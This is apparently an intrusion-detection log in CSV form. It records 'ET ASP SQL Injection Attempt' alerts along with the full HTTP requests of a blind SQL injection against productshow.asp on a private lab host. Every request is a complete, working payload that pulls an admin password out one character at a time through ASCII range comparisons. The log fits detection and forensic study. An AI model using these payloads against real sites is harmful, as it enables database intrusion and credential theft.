timestamp,msg,ip_src,src_port,ip_dst,dst_port
2019/03/24 15:35:45.069900 ,ET ASP SQL Injection Attempt,192.168.244.1,56742,192.168.244.136,80
2019/03/24 15:35:45.132788,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),5,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56743,192.168.244.136,80
2019/03/24 15:35:45.132788 ,ET ASP SQL Injection Attempt,192.168.244.1,56743,192.168.244.136,80
2019/03/24 15:35:45.179595,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),3,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56744,192.168.244.136,80
2019/03/24 15:35:45.179595 ,ET ASP SQL Injection Attempt,192.168.244.1,56744,192.168.244.136,80
2019/03/24 15:35:45.241305,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),2,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56745,192.168.244.136,80
2019/03/24 15:35:45.241305 ,ET ASP SQL Injection Attempt,192.168.244.1,56745,192.168.244.136,80
2019/03/24 15:35:45.305282,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),6,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56746,192.168.244.136,80
2019/03/24 15:35:45.305282 ,ET ASP SQL Injection Attempt,192.168.244.1,56746,192.168.244.136,80
2019/03/24 15:35:45.366904,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2043%20and%2047 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56747,192.168.244.136,80
2019/03/24 15:35:45.366904 ,ET ASP SQL Injection Attempt,192.168.244.1,56747,192.168.244.136,80
2019/03/24 15:35:45.428608,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),7,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56748,192.168.244.136,80
2019/03/24 15:35:45.428608 ,ET ASP SQL Injection Attempt,192.168.244.1,56748,192.168.244.136,80
2019/03/24 15:35:45.476271,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),4,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56749,192.168.244.136,80
2019/03/24 15:35:45.476271 ,ET ASP SQL Injection Attempt,192.168.244.1,56749,192.168.244.136,80
2019/03/24 15:35:45.539855,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),3,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56750,192.168.244.136,80
2019/03/24 15:35:45.539855 ,ET ASP SQL Injection Attempt,192.168.244.1,56750,192.168.244.136,80
2019/03/24 15:35:45.585323,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),8,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56751,192.168.244.136,80
2019/03/24 15:35:45.585323 ,ET ASP SQL Injection Attempt,192.168.244.1,56751,192.168.244.136,80
2019/03/24 15:35:45.632184,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),5,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56752,192.168.244.136,80
2019/03/24 15:35:45.632184 ,ET ASP SQL Injection Attempt,192.168.244.1,56752,192.168.244.136,80
2019/03/24 15:35:45.695048,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),2,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2042 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56753,192.168.244.136,80
2019/03/24 15:35:45.695048 ,ET ASP SQL Injection Attempt,192.168.244.1,56753,192.168.244.136,80
2019/03/24 15:35:45.757503,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),9,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56754,192.168.244.136,80
2019/03/24 15:35:45.757503 ,ET ASP SQL Injection Attempt,192.168.244.1,56754,192.168.244.136,80
2019/03/24 15:35:45.804669,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2050 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56755,192.168.244.136,80
2019/03/24 15:35:45.804669 ,ET ASP SQL Injection Attempt,192.168.244.1,56755,192.168.244.136,80
2019/03/24 15:35:45.881791,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),6,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56756,192.168.244.136,80
2019/03/24 15:35:45.881791 ,ET ASP SQL Injection Attempt,192.168.244.1,56756,192.168.244.136,80
2019/03/24 15:35:45.929096,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),10,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56757,192.168.244.136,80
2019/03/24 15:35:45.929096 ,ET ASP SQL Injection Attempt,192.168.244.1,56757,192.168.244.136,80
2019/03/24 15:35:45.990893,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),4,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2080%20and%20105 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56758,192.168.244.136,80
2019/03/24 15:35:45.990893 ,ET ASP SQL Injection Attempt,192.168.244.1,56758,192.168.244.136,80
2019/03/24 15:35:46.055582,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),3,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2067 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56759,192.168.244.136,80
2019/03/24 15:35:46.055582 ,ET ASP SQL Injection Attempt,192.168.244.1,56759,192.168.244.136,80
2019/03/24 15:35:46.116232,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),11,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56760,192.168.244.136,80
2019/03/24 15:35:46.116232 ,ET ASP SQL Injection Attempt,192.168.244.1,56760,192.168.244.136,80
2019/03/24 15:35:46.178856,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),7,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56761,192.168.244.136,80
2019/03/24 15:35:46.178856 ,ET ASP SQL Injection Attempt,192.168.244.1,56761,192.168.244.136,80
2019/03/24 15:35:46.241803,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),12,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56762,192.168.244.136,80
2019/03/24 15:35:46.241803 ,ET ASP SQL Injection Attempt,192.168.244.1,56762,192.168.244.136,80
2019/03/24 15:35:46.289810,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),5,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56763,192.168.244.136,80
2019/03/24 15:35:46.289810 ,ET ASP SQL Injection Attempt,192.168.244.1,56763,192.168.244.136,80
2019/03/24 15:35:46.351292,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),8,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56764,192.168.244.136,80
2019/03/24 15:35:46.351292 ,ET ASP SQL Injection Attempt,192.168.244.1,56764,192.168.244.136,80
2019/03/24 15:35:46.397965,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),2,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2043%20and%2047 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56765,192.168.244.136,80
2019/03/24 15:35:46.397965 ,ET ASP SQL Injection Attempt,192.168.244.1,56765,192.168.244.136,80
2019/03/24 15:35:46.476000,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),13,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56766,192.168.244.136,80
2019/03/24 15:35:46.476000 ,ET ASP SQL Injection Attempt,192.168.244.1,56766,192.168.244.136,80
2019/03/24 15:35:46.524212,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2051%20and%2051 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56767,192.168.244.136,80
2019/03/24 15:35:46.524212 ,ET ASP SQL Injection Attempt,192.168.244.1,56767,192.168.244.136,80
2019/03/24 15:35:46.585996,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),14,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56768,192.168.244.136,80
2019/03/24 15:35:46.585996 ,ET ASP SQL Injection Attempt,192.168.244.1,56768,192.168.244.136,80
2019/03/24 15:35:46.632482,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),9,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56769,192.168.244.136,80
2019/03/24 15:35:46.632482 ,ET ASP SQL Injection Attempt,192.168.244.1,56769,192.168.244.136,80
2019/03/24 15:35:46.694327,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),6,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56770,192.168.244.136,80
2019/03/24 15:35:46.694327 ,ET ASP SQL Injection Attempt,192.168.244.1,56770,192.168.244.136,80
2019/03/24 15:35:46.757788,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),15,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56771,192.168.244.136,80
2019/03/24 15:35:46.757788 ,ET ASP SQL Injection Attempt,192.168.244.1,56771,192.168.244.136,80
2019/03/24 15:35:46.821532,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),4,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2080%20and%2092 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56772,192.168.244.136,80
2019/03/24 15:35:46.821532 ,ET ASP SQL Injection Attempt,192.168.244.1,56772,192.168.244.136,80
2019/03/24 15:35:46.882070,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),16,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%20130 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56773,192.168.244.136,80
2019/03/24 15:35:46.882070 ,ET ASP SQL Injection Attempt,192.168.244.1,56773,192.168.244.136,80
2019/03/24 15:35:46.928708,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),10,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56774,192.168.244.136,80
2019/03/24 15:35:46.928708 ,ET ASP SQL Injection Attempt,192.168.244.1,56774,192.168.244.136,80
2019/03/24 15:35:46.991680,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),3,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2061 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56775,192.168.244.136,80
2019/03/24 15:35:46.991680 ,ET ASP SQL Injection Attempt,192.168.244.1,56775,192.168.244.136,80
2019/03/24 15:35:47.039546,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),7,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2080%20and%20105 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56776,192.168.244.136,80
2019/03/24 15:35:47.039546 ,ET ASP SQL Injection Attempt,192.168.244.1,56776,192.168.244.136,80
2019/03/24 15:35:47.101654,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),11,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56777,192.168.244.136,80
2019/03/24 15:35:47.101654 ,ET ASP SQL Injection Attempt,192.168.244.1,56777,192.168.244.136,80
2019/03/24 15:35:47.163185,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),5,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2067 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56778,192.168.244.136,80
2019/03/24 15:35:47.163185 ,ET ASP SQL Injection Attempt,192.168.244.1,56778,192.168.244.136,80
2019/03/24 15:35:47.226002,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),12,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56779,192.168.244.136,80
2019/03/24 15:35:47.226002 ,ET ASP SQL Injection Attempt,192.168.244.1,56779,192.168.244.136,80
